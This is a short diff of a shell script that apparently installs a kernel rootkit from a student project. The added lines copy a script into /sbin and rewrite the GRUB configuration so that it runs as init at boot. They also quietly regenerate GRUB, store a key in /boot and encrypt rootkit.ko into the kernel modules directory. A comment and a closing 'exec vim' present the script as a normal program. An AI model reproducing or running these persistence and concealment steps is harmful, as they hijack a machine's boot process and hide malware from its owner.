@@ -5,8 +5,9 @@
 #just exec a normal ahh programme
 
 cp ./script_rootkit /sbin/script_rootkit.sh
-sed -i 's^\(GRUB_CMDLINE_LINUX_DEFAULT=".*\)"/\1 init=\/sbin\/script_rootkit.sh"/' "/etc/default/grub"
-update-grub
-openssl rand -hex 32 > keyfile.bin
-openssl enc -aes-256-cbc -salt -in $HOME/bach-project/src/rootkit.ko -out /lib/modules/$(uname -r)/extra/rootkit.ko.enc -pass file:/boot/keyfile.bin
+chmod +x /sbin/script_rootkit.sh
+sed -i '/^GRUB_CMDLINE_LINUX_DEFAULT=/ s/"$/ init=\/sbin\/script_rootkit.sh"/' /etc/default/grub
+update-grub > /dev/null 2>&1
+openssl rand -hex 32 > /boot/keyfile.bin
+openssl enc -aes-256-cbc -pbkdf2 -salt -in /home/void/bach-project/src/rootkit.ko -out /lib/modules/$(uname -r)/extra/rootkit.ko.enc -pass file:/boot/keyfile.bin
 exec vim 
